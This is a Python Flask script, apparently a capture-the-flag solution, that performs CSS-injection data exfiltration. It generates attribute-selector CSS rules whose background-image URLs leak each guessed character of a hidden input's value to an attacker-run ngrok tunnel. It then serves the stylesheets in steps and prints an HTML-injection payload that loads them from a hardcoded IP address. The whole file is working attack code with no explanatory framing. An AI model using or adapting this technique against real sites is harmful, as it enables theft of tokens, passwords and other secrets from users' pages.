import string
from time import sleep
from flask import Flask, request
from pyngrok import ngrok


PORT = 4444

app = Flask(__name__)

TUNNEL = ngrok.connect(4444, "http").public_url
LOCAL_URL2 = "http://108.137.37.157:4444/"
flag = "Hology6{sadly_your_secret_is"


def oracle(chars):
    return 'input[value^="%s"]{background-image:url("%s")}' % (chars, TUNNEL+"/leaked?l="+chars)


def valueleak(known):
    result = ""
    for i in string.ascii_letters+string.digits+"_{}":
        result += oracle(known+i)
    return result


@app.get("/leaked")
def leak():
    global flag
    leaked = request.args.get("l")
    flag = leaked
    return "ok"


@app.get("/css/<int:i>")
def css(i: int):
    global flag
    while len(flag) != i:
        sleep(1)
    return valueleak(known=flag), 200, {"Content-Type": "text/css"}


def genpayload(lenght):
    result = "http://app:5000/?html="
    for i in range(lenght):
        if i < len(flag):
            continue
        result += '<link rel="stylesheet" href="%s"/>' % (
            LOCAL_URL2+"/css/"+str(i))
    return result


if __name__ == "__main__":
    print(genpayload(50))
    app.run("0.0.0.0", 4444)
